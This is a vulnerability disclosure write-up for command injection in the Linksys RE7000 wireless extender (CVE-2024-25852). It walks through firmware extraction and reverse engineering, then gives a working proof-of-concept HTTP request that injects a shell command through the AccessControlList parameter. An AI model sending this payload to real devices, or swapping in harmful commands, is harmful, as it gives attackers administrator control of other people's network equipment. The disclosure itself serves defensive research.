# Linksys RE7000 command injection vulnerability

## Vulnerability introduction

Product Description:

RE7000 is a new dual-band AC1900 wireless extender with seamless roaming function launched by Linksys.

Firmware download:

[https://downloads.linksys.com/support/assets/firmware/RE7000v2_PROD_FW_v2.0.15_211230_1012.bin](https://downloads.linksys.com/support/assets/firmware/RE7000v2_PROD_FW_v2.0.15_211230_1012.bin)

Vulnerability description:

The RE7000 wireless extender has a command execution vulnerability in the "AccessControlList" parameter of the access control function point. An attacker can use the vulnerability to obtain device administrator rights.

Affected versions:

RE7000 v2.0.9, RE7000 v2.0.11, RE7000 v2.0.15

Distribute CVE numbers:

CVE-2024-25852

## Vulnerability analysis

Vulnerability trigger point:

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1707376199229-b5c7b20a-8dfa-42d4-8973-ab11b79bbf6e.png#alt=https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2024%2Fpng%2F25976713%2F1707376199229-b5c7b20a-8dfa-42d4-8973-ab11b79bbf6e.png)

Use the binwalk tool to extract the firmware file system:

binwalk -Me --run-as=root RE7000v2_PROD_FW_v2.0.15_211230_1012.bin

Use the grep tool to quickly find vulnerability parameters:

grep -rl AccessControlList | grep .so

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1707376245009-faa8b767-3c67-4175-ada6-698e7ca185cd.png#alt=https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2024%2Fpng%2F25976713%2F1707376245009-faa8b767-3c67-4175-ada6-698e7ca185cd.png)

Use the IDA reverse tool to open the [libcbtjson.so](http://libcbtjson.so/) file and press Alt+t to search for the "AccessControlList" keyword:

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1707376456359-a15b0e7e-7498-4e36-a58a-97898f61365d.png#alt=https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2024%2Fpng%2F25976713%2F1707376456359-a15b0e7e-7498-4e36-a58a-97898f61365d.png)

Enter the ".rodata:0003B60C" read-only data address and see various types of parameter names, which are used to control different functions:

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1707376744134-cfa2ebd9-3b49-4c8d-8e45-87facd924a52.png#alt=https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2024%2Fpng%2F25976713%2F1707376744134-cfa2ebd9-3b49-4c8d-8e45-87facd924a52.png)

Enter the "set_accessControlList" function, obtain the incoming parameters a1 and a2 through the "set_value_nvram" function, format the a1 and a2 variables for output through the "fprintf" function, and finally substitute a2 into the "cbt_system" function to execute the system command.

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1707377071397-74cd7f3d-0afd-4ec3-88ea-632b715f12de.png#alt=https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2024%2Fpng%2F25976713%2F1707377071397-74cd7f3d-0afd-4ec3-88ea-632b715f12de.png)

## Vulnerability recurrence

Emulate or search network asset targets via qemu firmware:

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1711643640704-15dcfb2d-b1e7-4bc0-b851-adcfa202fa6e.png#alt=1)

Exploit POC:

```
PUT /goform/AccessControl HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Thu, 17 Sep 2020 11:24:58 GMT
If-None-Match: "14600429"
Content-Length: 81

{"AccessPolicy":"0","AccessControlList":"`ps>/etc_ro/lighttpd/RE7000_www/1.txt`"}
```

### Reappearance of v2.0.15 version

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1711643640843-1efc0eb3-d177-4536-bf46-3a72e17ef0c2.png#alt=3)

The BurpSuite tool sends the POC and executes the ps command to output to the 1.txt file:

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1711643640975-f0fd3622-e87a-4798-843c-80c63ad9a840.png#alt=5)

Access the 1.txt file to see that the attack was successful.

![](https://cdn.nlark.com/yuque/0/2024/png/25976713/1711643641155-f54c3628-f9c9-45dc-a874-e7e4cc2882d6.png#alt=6)



